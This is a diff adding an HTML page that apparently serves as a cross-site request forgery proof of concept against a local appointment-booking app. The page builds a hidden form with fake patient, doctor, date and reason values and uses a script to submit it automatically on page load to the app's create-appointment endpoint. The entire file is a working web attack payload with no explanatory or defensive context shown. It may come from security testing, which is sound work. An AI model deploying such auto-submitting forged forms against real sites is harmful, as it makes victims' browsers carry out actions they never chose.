@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    
+<form id="evilForm" action="http://127.0.0.1:5000/appointments/create" method="POST">
+    <input type="hidden" name="patient_name" value="HackedUser">
+    <input type="hidden" name="doctor_name" value="Dr Evil">
+    <input type="hidden" name="date" value="2025-12-30">
+    <input type="hidden" name="time" value="09:00">
+    <input type="hidden" name="reason" value="CSRF Attack">
+</form>
+
+<script>
+    document.getElementById("evilForm").submit();
+</script>
+
+</body>
+</html>
